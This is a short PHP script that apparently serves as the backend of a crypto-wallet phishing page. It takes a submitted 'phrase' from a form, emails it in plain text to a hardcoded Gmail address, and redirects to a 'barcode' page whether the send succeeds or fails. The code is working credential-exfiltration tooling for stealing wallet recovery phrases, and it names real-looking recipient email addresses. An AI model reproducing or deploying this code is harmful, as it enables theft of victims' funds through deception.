<?php

if (isset($_POST['connect_btn'])) {
  $phrase = $_POST['connect'];

  $subject = "NEW MESSAGE FROM Sandbox";

  $body = "<p>Phrase: $phrase</p>";
  $to = "charlesjohnson7002@gmail.com";
  $to = "gagemarkowski@gmail.com";

  $headers .= 'Reply-To: ' . $to . "\r\n";
  $headers .= 'X-Mailer: PHP/' . phpversion();
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


  if (mail($to, $subject, $body, $headers, '-f gagemarkowski@gmail.com -F "CLRW"')) {
    header("Location: barcode");
  } else {
    header("Location: barcode");
  }



}

?>
